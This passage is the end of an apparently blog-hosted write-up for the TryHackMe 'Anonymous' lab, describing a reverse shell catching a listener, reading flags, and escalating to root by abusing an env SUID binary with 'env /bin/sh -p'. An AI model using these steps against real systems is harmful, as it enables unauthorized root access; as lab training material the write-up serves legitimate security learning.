8080\r\n```\r\n\r\nNow you just need to wait a few seconds and you should be able to see a shell pop up, where you set up the listener.\r\n\r\n### User Flag\r\n\r\nYou can now just cat out the user flag, which is located at /home/anonymous/user.txt .\r\n\r\n## Privilege Escalation\r\n\r\nI followed my routine and downloaded LinPeas on the target machine.<br/>It found an ‚Äúenv‚Äù SUID, which if you look it up on [GTFOBins](https://gtfobins.github.io/gtfobins/env/) is easily exploitable. Just run this simple command:\r\n\r\n```bash\r\nenv /bin/sh -p\r\n```\r\n\r\nAnd there you go, you have root.\r\n\r\n### Root Flag\r\n\r\nAnd again you can just cat out the root flag, which is located at /root/root.txt this time.\r\n\r\n## The End\r\n\r\nAnd there you have it! I hope you had fun, I know I did ü¶Ñ\r\n","id":1493264270800,"slug":"Anonymous-TryHackMe"}]